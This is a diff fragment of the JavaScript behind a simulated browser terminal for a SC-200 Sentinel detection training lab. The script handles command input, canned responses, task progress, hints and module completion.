+        function addLine(t,c) { var d=document.createElement('div'); d.className='term-line'+(c?' '+c:''); d.textContent=t; outputEl.appendChild(d); outputEl.scrollTop=outputEl.scrollHeight; }
+        function addHTML(h,c) { var d=document.createElement('div'); d.className='term-line'+(c?' '+c:''); d.innerHTML=h; outputEl.appendChild(d); outputEl.scrollTop=outputEl.scrollHeight; }
+        function addBlank() { addLine('',''); }
+        function addPromptLine(cmd) { addHTML('<span class="term-prompt-span">socanalyst@sentinel-lab</span><span class="term-ps1-sep">:</span><span class="term-path-span">~</span><span class="term-ps1-sep">$ </span>'+escH(cmd),'term-line-cmd'); }
+
+        function execLine(raw) {
+            var trimmed = raw.trim();
+            addPromptLine(trimmed);
+            if (!trimmed) return;
+            var matched = false;
+            for (var key in CMD_RESPONSES) {
+                if (trimmed === key || trimmed.indexOf(key) === 0) {
+                    var resp = CMD_RESPONSES[key];
+                    resp.lines.forEach(function(l) { addLine(l.text, l.cls); });
+                    addBlank();
+                    if (resp.completesTask) { completeTask(resp.completesTask); }
+                    matched = true;
+                    break;
+                }
+            }
+            if (!matched) {
+                if (trimmed === 'help') { addLine('Type the commands shown in the task instructions.', 'term-line-info'); addLine('Each task provides the exact command to run.', 'term-line-dim'); }
+                else if (trimmed === 'clear') { outputEl.innerHTML = ''; }
+                else { addLine('Command not recognized in this lab simulation. Check the task instructions.', 'term-line-err'); }
+            }
+        }
+
+        function completeTask(num) {
+            if (taskDone[num]) return;
+            taskDone[num] = true;
+            var card = document.getElementById('task-card-' + num);
+            if (card) { card.classList.add('completed'); card.classList.remove('active'); }
+            var doneCount = Object.keys(taskDone).filter(function(k){return taskDone[k];}).length;
+            document.getElementById('taskProgress').textContent = doneCount + ' / ' + TOTAL_TASKS + ' Tasks';
+            document.getElementById('progressBarFill').style.width = Math.round((doneCount/TOTAL_TASKS)*100) + '%';
+            addBlank();
+            addHTML('  <span style="color:#34d399">[Task ' + num + ' complete]</span> <span style="color:#5a2020">' + escH(TASK_NAMES[num]||'') + '</span>', 'term-line-info');
+            addBlank();
+            if (doneCount === TOTAL_TASKS) { setTimeout(function(){ document.getElementById('successOverlay').classList.add('active'); }, 700); return; }
+            var next = null; for (var j=1;j<=TOTAL_TASKS;j++) { if (!taskDone[j]) { next=j; break; } }
+            if (next) selectTask(next);
+        }
+
+        function selectTask(num) {
+            currentTask = num;
+            for (var i=1;i<=TOTAL_TASKS;i++) { var c=document.getElementById('task-card-'+i); if(c){c.classList.remove('active'); if(i===num) c.classList.add('active');} }
+            var info = TASK_INSTRUCTIONS[num]; if (!info) return;
+            var stepEl=document.getElementById('instructionsStep'); var hintEl=document.getElementById('instructionsHint'); var hintCmd=document.getElementById('hintCommand');
+            if (stepEl) stepEl.innerHTML = info.step.replace(/\n/g,'<br>');
+            if (hintEl) hintEl.textContent = info.hint;
+            if (hintCmd) { hintCmd.textContent = info.cmd; hintCmd.classList.remove('visible'); }
+            var panel=document.getElementById('instructionsPanel'); if(panel&&panel.classList.contains('collapsed')) panel.classList.remove('collapsed');
+        }
+
+        window.selectTask = selectTask;
+        window.toggleInstructions = function() { document.getElementById('instructionsPanel').classList.toggle('collapsed'); };
+        window.revealHint = function() { var h=document.getElementById('hintCommand'); if(h) h.classList.toggle('visible'); };
+        window.finishLab = function() { if (typeof ModuleProgress !== 'undefined') { ModuleProgress.complete('shield', 'sc200-ch07-lab', { returnUrl: '../index.html' }); } else { window.location.href = '../index.html'; } };
+
+        function init() {
+            outputEl = document.getElementById('termOutput');
+            inputEl = document.getElementById('termInput');
+            ps1PathEl = document.getElementById('termPS1Path');
+            if (!outputEl || !inputEl) return;
+            addLine("Sentinel Detection Lab -- SC-200 Chapter 7", "term-welcome");
+            addLine("Shield House KQL and Analytics Rules Terminal", "term-welcome");
+            addLine("", "term-line-out");
+            addLine("Write KQL queries, inspect analytics rules, review threat intelligence, and hunt for threats.", "term-line-info");
+            addLine("Type \"help\" for guidance. Complete 10 tasks to finish the lab.", "term-line-info");
+            addBlank();
+            inputEl.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') { var cmd=inputEl.value; inputEl.value=''; if(cmd.trim()){cmdHistory.push(cmd);histIdx=cmdHistory.length;} execLine(cmd); }
+                else if (e.key === 'ArrowUp') { e.preventDefault(); if(histIdx>0){histIdx--;inputEl.value=cmdHistory[histIdx];} }
+                else if (e.key === 'ArrowDown') { e.preventDefault(); if(histIdx<cmdHistory.length-1){histIdx++;inputEl.value=cmdHistory[histIdx];}else{histIdx=cmdHistory.length;inputEl.value='';} }
+            });
+            outputEl.addEventListener('click', function(){ inputEl.focus(); });
+            inputEl.focus();
+            selectTask(1);
+        }
+        if (document.readyState === 'loading') { document.addEventListener('DOMContentLoaded', init); } else { init(); }
+    })();
+    </script>
+    <script src="../../../../components/AchievementManager.js"></script>
+    <script src="../../../../components/FluxCapacitor.js"></script>
+</body>
+</html>
